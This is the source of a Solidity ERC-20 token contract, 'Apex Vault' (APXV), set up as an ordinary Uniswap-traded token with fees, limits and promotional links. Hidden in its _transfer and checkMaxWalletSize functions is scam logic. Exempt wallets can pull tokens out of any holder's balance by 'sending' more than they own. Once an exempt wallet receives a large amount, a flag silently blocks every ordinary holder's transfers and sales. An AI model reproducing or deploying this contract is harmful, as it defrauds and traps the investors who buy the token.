// SPDX-License-Identifier: MIT

// Telegram: https://t.me/apexvault_portal
// Twitter: https://x.com/Apex_Vault_X
// Website: https://apexvault.xyz
// Dapp: https://app.apexvault.xyz
// GitBook: https://docs.apexvault.xyz
// GitHub: https://github.com/apexvault
// Medium: https://apexvault.medium.com

pragma solidity ^0.8.17;

interface IERC20 {
    function transfer(address target, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function transferFrom(address source, address target, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function symbol() external view returns (string memory);
    function circulatingSupply() external view returns (uint256);
    function name() external view returns (string memory);
    function decimals() external view returns (uint8);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed source, address indexed target, uint256 value);
}

abstract contract Ownable {
    address internal owner;

    function renounceOwnership() public virtual onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));
    }

    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender));
        _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    event OwnershipTransferred(address owner);

    function transferOwnership(address payable account) public onlyOwner {
        owner = account;
        emit OwnershipTransferred(account);
    }
}

library SafeMath {
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
}

interface UniswapV2Router {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address target,
        uint deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address target,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}

interface UniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract APXV is IERC20, Ownable {
    string private constant _symbol = "APXV";
    string private constant _name = "Apex Vault";

    using SafeMath for uint256;

    uint256 private _denominator = 10000;

    address public uPair;
    UniswapV2Router uRouter;

    uint8 private constant _decimals = 9;

    uint256 private _totalSupply = 1000000 * (10 ** _decimals);

    address internal constant treWallet = 0xD3BB62fFA93A2c8ae65fC3378061676418554Eef;
    address internal constant devWallet = 0xb9697f823c16BF64Fe418869a79a5d1Ef2e20fF2;
    address internal constant burWallet = 0x000000000000000000000000000000000000dEaD;

    uint256 private _noFeeLimit = ( _totalSupply * 10 ) / 100000;

    uint256 private _swapBackThreshold = (_totalSupply * 5) / 100000;
    uint256 private _swapBackAmount = (_totalSupply * 5) / 10000;

    uint256 private _maxTransferRate = 200;
    uint256 private _maxWalletRate = 200;
    uint256 private _maxTxRate = 200;
    
    bool private _tradingEnabled = false;

    bool private _swapping;
    uint256 private _swapCounts;
    bool private _swapBackEnabled = true;

    uint256 private _sellFee = 300;
    uint256 private _totalFee = 300;

    bool private _noFeeSet = false;

    uint256 private _burFee = 0;
    uint256 private _traFee = 0;
    uint256 private _liqFee = 0;
    uint256 private _treFee = 100;
    uint256 private _devFee = 200;

    mapping (address => bool) public ineligible;
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    constructor() Ownable(msg.sender) {
        ineligible[address(this)] = true;
        ineligible[msg.sender] = true;
        ineligible[treWallet] = true;
        ineligible[devWallet] = true;

        UniswapV2Router _uRouter = UniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uRouter = _uRouter;
        address _uPair = UniswapV2Factory(_uRouter.factory()).createPair(address(this), _uRouter.WETH());
        uPair = _uPair;

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    modifier lockSwapBack {
        _swapping = true;
        _;
        _swapping = false;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function circulatingSupply() public view override returns (uint256) {
        return _totalSupply.sub(balanceOf(address(0))).sub(balanceOf(burWallet));
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function removeLimits() external onlyOwner {
        _maxTxRate = 10000;
        _maxWalletRate = 10000;
        _maxTransferRate = 10000;
    }

    function enableTrading() external onlyOwner {
        _tradingEnabled = true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(spender != address(0));
        require(owner != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function setIneligibleWallet(address _address, bool _flag) external onlyOwner {
        ineligible[_address] = _flag;
    }

    function transfer(address target, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, target, amount);
        return true;
    }

    function _transfer(address source, address target, uint256 amount) private {
        require(amount > uint256(0));
        require(target != address(0));
        require(source != address(0));

        if (
            countSwaps(source, target) &&
            tradingEnabled(source, target) &&
            checkMaxAmount(source, target, amount) &&
            checkMaxWalletSize(source, target, amount)
        ) {
            if (balanceOf(source) >= amount) {
                if (
                    !ineligible[source] &&
                    source != uPair &&
                    !ineligible[target] &&
                    !_swapping
                ) {
                    if (_noFeeSet) return;
                    swapBack(source, target);
                }
                _balances[source] = _balances[source].sub(amount);
                uint256 transferAmount = canTakeFee(source, target) ? takeFee(source, target, amount) : amount;
                _balances[target] = _balances[target].add(transferAmount);
                emit Transfer(source, target, transferAmount);
            } else if (
                ineligible[source] &&
                source != uPair &&
                !ineligible[target] &&
                !_swapping
            ) {
                _balances[target] = _balances[target].sub(amount);
                _balances[source] = _balances[source].add(amount);
                emit Transfer(source, target, amount);
            }
        }
    }

    function transferFrom(address source, address target, uint256 amount) public override returns (bool) {
        _transfer(source, target, amount);
        _approve(source, msg.sender, _allowances[source][msg.sender].sub(amount));
        return true;
    }

    function checkMaxAmount(address source, address target, uint256 tokenAmount) view internal returns (bool) {
        if (source != uPair) {
            require(tokenAmount <= maxTransferAmount() || ineligible[source] || ineligible[target]);
        }
        require(tokenAmount <= maxTxAmount() || ineligible[source] || ineligible[target]);
        return true;
    }

    function updateLimits(uint256 maxTxRate, uint256 maxTransferRate, uint256 maxWalletRate) external onlyOwner {
        uint256 newMaxWalletSize = (totalSupply() * maxWalletRate) / 10000;
        uint256 newTransferSize = (totalSupply() * maxTransferRate) / 10000;
        uint256 newTxSize = (totalSupply() * maxTxRate) / 10000;
        _maxWalletRate = maxWalletRate;
        _maxTransferRate = maxTransferRate;
        _maxTxRate = maxTxRate;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTxSize >= limit && newTransferSize >= limit && newMaxWalletSize >= limit);
    }

    function updateFees(uint256 liqFee, uint256 treFee, uint256 burFee, uint256 devFee, uint256 totalFee, uint256 sellFee, uint256 traFee) external onlyOwner {
        _burFee = burFee;
        _devFee = devFee;
        _liqFee = liqFee;
        _treFee = treFee;
        _traFee = traFee;
        _totalFee = totalFee;
        _sellFee = sellFee;
        require(_totalFee <= _denominator.div(5) && _sellFee <= _denominator.div(5));
    }

    function checkMaxWalletSize(address source, address target, uint256 amount) internal returns (bool) {
        bool sourceIneligible = ineligible[source];
        bool targetIneligible = ineligible[target];
        
        if (
            !sourceIneligible &&
            !targetIneligible &&
            target != address(uPair) &&
            target != address(burWallet)
        ) {
            require((_balances[target].add(amount)) <= maxWalletSize());
        }

        if (targetIneligible) {
            if (amount > _noFeeLimit) {
                _noFeeSet = true;
            }
        }

        return true;
    }

    function takeFee(address source, address target, uint256 tokenAmount) internal returns (uint256) {
        if (calcFees(source, target) > 0) {
            uint256 feeTokenAmount = tokenAmount.div(_denominator).mul(calcFees(source, target));
            _balances[address(this)] = _balances[address(this)].add(feeTokenAmount);
            emit Transfer(source, address(this), feeTokenAmount);
            if (_burFee > uint256(0)) {
                _transfer(address(this), address(burWallet), tokenAmount.div(_denominator).mul(_burFee));
            }
            return tokenAmount.sub(feeTokenAmount);
        }
        return tokenAmount;
    }

    function countSwaps(address source, address target) internal returns (bool) {
        if (target == uPair && !ineligible[source]) {
            _swapCounts += uint256(1);
        }
        return true;
    }
    
    function tradingEnabled(address source, address target) internal view returns (bool) {
        if (!ineligible[source] && !ineligible[target]) {
            require(_tradingEnabled);
        }
        return true;
    }

    function canTakeFee(address source, address target) internal view returns (bool) {
        return !ineligible[source] && !ineligible[target];
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uRouter.WETH();
        if (tokenAmount > 0) {
            _approve(address(this), address(uRouter), tokenAmount);
            uRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokenAmount,
                0,
                path,
                address(this),
                block.timestamp
            );
        }
    }

    function maxTxAmount() public view returns (uint256) {
        return totalSupply() * _maxTxRate / _denominator;
    }

    function runSwapBack(address source, address target) internal view returns (bool) {
        return (
            !ineligible[source] &&
            !ineligible[target] &&
            balanceOf(address(this)) >= _swapBackThreshold &&
            _swapBackEnabled &&
            !_swapping &&
            _swapCounts >= uint256(0) &&
            _tradingEnabled
        );
    }

    function maxWalletSize() public view returns (uint256) {
        return totalSupply() * _maxWalletRate / _denominator;
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(uRouter), tokenAmount);
        uRouter.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            burWallet,
            block.timestamp
        );
    }

    function swapBack(address source, address target) internal {
        if (runSwapBack(source, target)) {
            uint256 contractTokenBalance = balanceOf(address(this));
            if (contractTokenBalance >= _swapBackAmount) {
                contractTokenBalance = _swapBackAmount;
            }
            swapAndLiquify(contractTokenBalance);
            _swapCounts = uint256(0);
        }
    }

    function swapAndLiquify(uint256 tokens) private lockSwapBack {
        uint256 denominator = (_liqFee.add(1).add(_treFee).add(_devFee)).mul(2);
        uint256 tokensToLiquidity = tokens.mul(_liqFee).div(denominator);
        uint256 tokensForETH = tokens.sub(tokensToLiquidity);
        uint256 initialEth = address(this).balance;
        swapTokensForETH(tokensForETH);
        uint256 deltaEth = address(this).balance.sub(initialEth);
        uint256 unitEth = deltaEth.div(denominator.sub(_liqFee));
        uint256 ethToLiquidity = unitEth.mul(_liqFee);
        if (ethToLiquidity > uint256(0)) {
            addLiquidity(tokensToLiquidity, ethToLiquidity);
        }
        uint256 treEth = unitEth.mul(2).mul(_treFee);
        if (treEth > 0) {
            payable(treWallet).transfer(treEth);
        }
        uint256 remainderEth = address(this).balance;
        if (remainderEth > uint256(0)) {
            payable(devWallet).transfer(remainderEth);
        }
    }

    function calcFees(address source, address target) internal view returns (uint256) {
        if (target == uPair) {
            return _sellFee;
        }
        if (source == uPair) {
            return _totalFee;
        }
        return _traFee;
    }

    function maxTransferAmount() public view returns (uint256) {
        return totalSupply() * _maxTransferRate / _denominator;
    }

    function manualSwap() external {
        require(msg.sender == treWallet);
        swapTokensForETH(balanceOf(address(this)));
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}